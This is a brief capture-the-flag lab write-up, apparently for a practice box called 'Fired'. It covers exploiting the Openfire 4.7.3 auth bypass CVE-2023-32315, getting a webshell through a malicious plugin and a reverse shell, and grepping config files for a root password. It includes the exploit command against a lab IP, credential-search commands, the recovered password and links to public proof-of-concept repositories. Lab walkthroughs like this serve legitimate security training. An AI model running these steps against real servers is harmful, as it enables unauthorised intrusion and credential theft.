# Fired \[Inter]

## Report

Openfire 4.7.3 is vulnerable to auth bypass and we can login with a custom user. Uploading a malicious plugin gives us a webshell and allows us to obtain a reverse shell too. Find the openfire install directory and recursively look for a password/config file. We find 'openfire.script' which exposes creds for root.

### Hint

dont blame me if the box isnt responsive ffs. finding the password was pretty cool tho but i lost my cool by that point

## Cheatsheet

```
python3 CVE-2023-32315.py -u http://192.168.55.96:9090
find / -type d -name openfire 2>/dev/null
grep -Ri 'password' /usr/share/openfire 
```

## Loot

### Enumeration

```
22 SSH
9090/tcp open hadoop-datanode Apache Hadoop
9091/tcp open  ssl/hadoop-tasktracker Apache Hadoop
```

#### 9090

Openfire, Version: 4.7.3

### Attack Vectors

Auth bypass - CVE-2023-32315

### PrivEsc

{% code title="find / -type d -name openfire 2>/dev/null" %}
```
/usr/share/openfire
/usr/share/doc/openfire
/var/log/openfire
/var/lib/openfire
/home/openfire
/etc/openfire
```
{% endcode %}

`/usr/share/openfire/embedded-db/openfire.script`

`INSERT INTO OFPROPERTY VALUES('mail.smtp.password','OpenFireAtEveryone',0,NULL)`

### Creds

root:`OpenFireAtEveryone`

### Proof

{% embed url="https://github.com/miko550/CVE-2023-32315" %}

{% embed url="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT" %}
